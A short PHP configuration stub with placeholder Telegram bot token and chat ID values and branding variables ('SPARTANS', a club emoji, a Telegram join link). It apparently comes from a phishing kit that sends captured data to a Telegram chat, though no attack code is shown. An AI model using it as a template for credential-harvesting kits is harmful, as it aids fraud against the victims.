<?php
/**


**/


/* Put here your TELEGRAM info   */
$botToken="xxxxx";
$chatId="xxxxx";  

$Our_Name = " ♣️ " ; 
$Name_page = "SPARTANS" ;
$JoinUs_On_telegram = "";



?>